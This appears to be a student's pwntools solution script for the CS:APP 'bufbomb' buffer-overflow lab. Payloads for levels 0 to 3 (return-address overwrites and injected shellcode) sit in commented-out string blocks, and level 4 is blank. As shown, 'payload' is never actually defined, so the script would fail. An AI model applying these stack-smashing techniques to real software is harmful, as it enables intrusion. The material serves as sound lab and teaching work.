from pwn import *
import re

context(os = 'linux', arch = 'i386', log_level = 'debug')

sh = process(["./bufbomb", "-u", "xlj"])

Cookie = sh.recvline()
Cookie = sh.recvline()
Cookie = re.findall("Cookie: (.+?)\n", Cookie)[0]

Cookie = int(Cookie, 16)
print(Cookie)

stack_begin = 0x55683a68
stack_end = 0x55683a94
stack_len = stack_end - stack_begin

'''
level 0 answer: smoke

Ad_smoke = 0x08048C18
payload = '\x00' * (stack_end - stack_begin) + p32(Ad_smoke)
'''

'''
level 1 answer: fizz
when in a function: 
stack: (args):args use ebp add offset to use
...
args[1]
args[0]
last func_address
ebp == last_esp
...
esp == ebp - size of local_var

Ad_fizz = 0x08048C42
payload = '\x00' * (stack_end - stack_begin) + p32(Ad_fizz) + p32(0) + p32(Cookie)
'''

'''
level 2 answer: bang

Ad_globalvar = 0x0804D100
shellcode = '''
#mov ebx, %d;
#mov eax, %d;
#mov [ebx], eax;
#ret;
''' % (Ad_globalvar, Cookie)
shellcode = asm(shellcode)
Ad_bang = 0x08048C9D
payload = shellcode + '\x00' * (stack_len - len(shellcode)) + p32(stack_begin) + p32(Ad_bang)
'''

'''
level 3 answer: test
use gdb to get the message of 0x0804920A[After Gets]
leave == mov esp, ebp;pop ebp
so we just need to make ebp and stack right

Ad_AfterGets = 0x08048DBE
last_ebp = 0x55683ac0
shellcode = '''
#mov eax, %d;
#push %d;
#pop ebp;
#push %d;
#ret;
''' % (Cookie, last_ebp, Ad_AfterGets)
shellcode = asm(shellcode) 
payload = shellcode + '\x00' * (stack_len - len(shellcode)) + p32(stack_begin)
'''

'''
level 4 answer:
'''
sh.sendline(payload)
print(sh.recvall())